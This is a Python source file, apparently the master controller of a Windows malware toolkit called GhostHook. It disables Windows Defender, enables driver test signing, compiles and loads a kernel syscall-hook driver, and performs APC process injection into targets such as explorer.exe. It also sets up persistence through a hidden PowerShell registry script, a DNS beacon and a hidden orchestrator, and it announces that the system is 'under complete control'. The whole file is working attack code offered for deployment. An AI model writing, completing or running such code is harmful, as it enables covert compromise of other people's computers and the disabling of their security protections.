#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
import json
from pathlib import Path
from datetime import datetime
import psutil
import ctypes
from typing import Dict, List, Optional

class GhostHookAutomation:
    def __init__(self):
        self.base_dir = Path(__file__).parent.absolute()
        self.log_file = self.base_dir / "ghosthook.log"
        self.status_file = self.base_dir / "status.json"
        self.config = {
            "target_processes": ["notepad.exe", "calc.exe", "explorer.exe"],
            "persistence_methods": ["registry", "dns", "tpm"],
            "monitoring_enabled": True,
            "self_destruct_threshold": 0.87,
            "compilation_timeout": 30
        }
        self.status = {
            "deployment_time": None,
            "target_pid": None,
            "active_components": [],
            "last_heartbeat": None
        }
    
    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        print(log_entry)
        
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")
    
    def check_privileges(self) -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def disable_defender(self):
        self.log("Disabling Windows Defender...")
        commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true', 
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true'
        ]
        
        for cmd in commands:
            try:
                subprocess.run(['powershell', '-Command', cmd], 
                             capture_output=True, timeout=10)
            except subprocess.TimeoutExpired:
                pass
        
        try:
            subprocess.run(['sc', 'stop', 'WinDefend'], capture_output=True)
        except:
            pass
        
        self.log("Windows Defender disabled", "OK")
    
    def enable_test_signing(self):
        self.log("Enabling test signing...")
        try:
            subprocess.run(['bcdedit', '/set', 'testsigning', 'on'], 
                         capture_output=True, check=True)
            self.log("Test signing enabled", "OK")
        except subprocess.CalledProcessError:
            self.log("Test signing enable failed", "WARNING")
    
    def compile_components(self) -> bool:
        self.log("Compiling all components...")
        success_count = 0
        
        components = [
            ("driver (kernel-mode operations)/syscall_hook.c", "cl.exe syscall_hook.c /kernel"),
            ("injector/apc_queuer.cpp", "cl.exe apc_queuer.cpp /link kernel32.lib"),
            ("persistence/dns_beacon.cpp", "cl.exe dns_beacon.cpp /link ws2_32.lib dnsapi.lib"),
            ("self_destruct/entropy_monitor.rs", "rustc entropy_monitor.rs -o entropy_monitor.exe")
        ]
        
        for source, compile_cmd in components:
            source_path = self.base_dir / source
            if source_path.exists():
                try:
                    result = subprocess.run(
                        compile_cmd.split(), 
                        cwd=source_path.parent,
                        capture_output=True, 
                        timeout=self.config["compilation_timeout"]
                    )
                    if result.returncode == 0:
                        self.log(f"Compiled {source_path.name}", "OK")
                        success_count += 1
                    else:
                        self.log(f"Compilation failed: {source_path.name}", "ERROR")
                except subprocess.TimeoutExpired:
                    self.log(f"Compilation timeout: {source_path.name}", "ERROR")
                except FileNotFoundError:
                    self.log(f"Compiler not found for: {source_path.name}", "ERROR")
        
        return success_count > 0
    
    def select_target(self) -> Optional[int]:
        self.log("Selecting optimal target process...")
        
        try:
            from injector.process_selector import ProcessSelector
            selector = ProcessSelector()
            target = selector.select_optimal_target()
            
            if target:
                pid = target['pid']
                self.log(f"Target selected: PID {pid} ({target['name']})", "OK")
                self.status["target_pid"] = pid
                return pid
        except Exception as e:
            self.log(f"Auto-selection failed: {e}", "WARNING")
        
        for proc_name in self.config["target_processes"]:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == proc_name.lower():
                    pid = proc.info['pid']
                    self.log(f"Fallback target: PID {pid} ({proc_name})", "OK")
                    self.status["target_pid"] = pid
                    return pid
        
        self.log("No suitable target found", "ERROR")
        return None
    
    def load_kernel_driver(self) -> bool:
        self.log("Loading kernel driver...")
        driver_path = self.base_dir / "driver (kernel-mode operations)" / "syscall_hook.sys"
        
        if not driver_path.exists():
            self.log("Kernel driver not found", "WARNING")
            return False
        
        commands = [
            ['sc', 'delete', 'GhostDriver'],
            ['sc', 'create', 'GhostDriver', f'binPath={driver_path}', 'type=kernel'],
            ['sc', 'start', 'GhostDriver']
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, capture_output=True)
            except:
                pass
        
        time.sleep(2)
        
        try:
            result = subprocess.run(['sc', 'query', 'GhostDriver'], capture_output=True, text=True)
            if 'RUNNING' in result.stdout:
                self.log("Kernel driver loaded successfully", "OK")
                self.status["active_components"].append("kernel_driver")
                return True
        except:
            pass
        
        self.log("Kernel driver load failed", "WARNING")
        return False
    
    def execute_injection(self, target_pid: int) -> bool:
        self.log("Executing process injection...")
        injector_path = self.base_dir / "injector" / "apc_queuer.exe"
        
        if not injector_path.exists():
            self.log("APC injector not found", "WARNING")
            return False
        
        try:
            result = subprocess.run([str(injector_path), str(target_pid)], 
                                  capture_output=True, timeout=30)
            if result.returncode == 0:
                self.log("Process injection successful", "OK")
                self.status["active_components"].append("injection")
                return True
        except subprocess.TimeoutExpired:
            self.log("Injection timeout", "ERROR")
        except Exception as e:
            self.log(f"Injection failed: {e}", "ERROR")
        
        return False
    
    def establish_persistence(self):
        self.log("Establishing persistence mechanisms...")
        
        if "registry" in self.config["persistence_methods"]:
            reg_script = self.base_dir / "persistence" / "registry_shadow.ps1"
            if reg_script.exists():
                try:
                    subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', 
                                  '-WindowStyle', 'Hidden', '-File', str(reg_script)],
                                 capture_output=True)
                    self.log("Registry persistence installed", "OK")
                    self.status["active_components"].append("registry_persistence")
                except Exception as e:
                    self.log(f"Registry persistence failed: {e}", "ERROR")
        
        if "dns" in self.config["persistence_methods"]:
            dns_beacon = self.base_dir / "persistence" / "dns_beacon.exe"
            if dns_beacon.exists():
                try:
                    subprocess.Popen([str(dns_beacon)], 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    time.sleep(1)
                    
                    if any(proc.name() == "dns_beacon.exe" for proc in psutil.process_iter()):
                        self.log("DNS beacon started", "OK")
                        self.status["active_components"].append("dns_beacon")
                except Exception as e:
                    self.log(f"DNS beacon startup failed: {e}", "ERROR")
        
        if "tpm" in self.config["persistence_methods"]:
            orchestrator = self.base_dir / "Orchestrator" / "ghosthook_orchestrator.py"
            if orchestrator.exists():
                try:
                    subprocess.Popen([sys.executable, str(orchestrator)],
                                   creationflags=subprocess.CREATE_NO_WINDOW)
                    self.log("TPM orchestrator started", "OK")
                    self.status["active_components"].append("tpm_orchestrator")
                except Exception as e:
                    self.log(f"TPM orchestrator failed: {e}", "ERROR")
    
    def start_monitoring(self):
        if not self.config["monitoring_enabled"]:
            return
        
        self.log("Starting monitoring systems...")
        entropy_monitor = self.base_dir / "self_destruct" / "entropy_monitor.exe"
        
        if entropy_monitor.exists():
            try:
                subprocess.Popen([str(entropy_monitor)],
                               creationflags=subprocess.CREATE_NO_WINDOW)
                time.sleep(1)
                
                if any(proc.name() == "entropy_monitor.exe" for proc in psutil.process_iter()):
                    self.log("Entropy monitoring active", "OK")
                    self.status["active_components"].append("entropy_monitor")
            except Exception as e:
                self.log(f"Entropy monitor startup failed: {e}", "ERROR")
    
    def verify_deployment(self) -> bool:
        self.log("Verifying deployment status...")
        active_count = len(self.status["active_components"])
        
        self.log(f"Active components: {active_count}")
        for component in self.status["active_components"]:
            self.log(f"  ✓ {component}")
        
        if active_count >= 2:
            self.log("Deployment verification passed", "OK")
            return True
        else:
            self.log("Insufficient components active", "WARNING")
            return False
    
    def save_status(self):
        self.status["last_heartbeat"] = datetime.now().isoformat()
        with open(self.status_file, "w") as f:
            json.dump(self.status, f, indent=2)
    
    def heartbeat_monitor(self):
        while True:
            time.sleep(60)
            self.status["last_heartbeat"] = datetime.now().isoformat()
            
            active_processes = []
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] in ["dns_beacon.exe", "entropy_monitor.exe"]:
                    active_processes.append(proc.info['name'])
            
            if len(active_processes) < len(self.status["active_components"]) - 1:
                self.log("Component failure detected", "WARNING")
            
            self.save_status()
    
    def deploy(self) -> bool:
        self.log("Starting GhostHook automated deployment")
        self.status["deployment_time"] = datetime.now().isoformat()
        
        if not self.check_privileges():
            self.log("Administrator privileges required!", "ERROR")
            return False
        
        try:
            self.disable_defender()
            self.enable_test_signing()
            
            if not self.compile_components():
                self.log("Component compilation failed", "ERROR")
                return False
            
            target_pid = self.select_target()
            if not target_pid:
                return False
            
            self.load_kernel_driver()
            self.execute_injection(target_pid)
            self.establish_persistence()
            self.start_monitoring()
            
            success = self.verify_deployment()
            
            if success:
                self.log("GhostHook deployment completed successfully!", "SUCCESS")
                self.save_status()
                
                threading.Thread(target=self.heartbeat_monitor, daemon=True).start()
            
            return success
            
        except Exception as e:
            self.log(f"Deployment failed: {e}", "ERROR")
            return False

def main():
    automation = GhostHookAutomation()
    
    print("╔══════════════════════════════════════════╗")
    print("║        GhostHook Python Automation      ║")
    print("║           Master Controller v2.0        ║")
    print("╚══════════════════════════════════════════╝")
    print()
    
    success = automation.deploy()
    
    if success:
        print("\n[SUCCESS] System is now under complete control")
        print("Press Ctrl+C to exit monitoring...")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nExiting...")
    else:
        print("\n[FAILED] Deployment unsuccessful")
        sys.exit(1)

if __name__ == "__main__":
    main()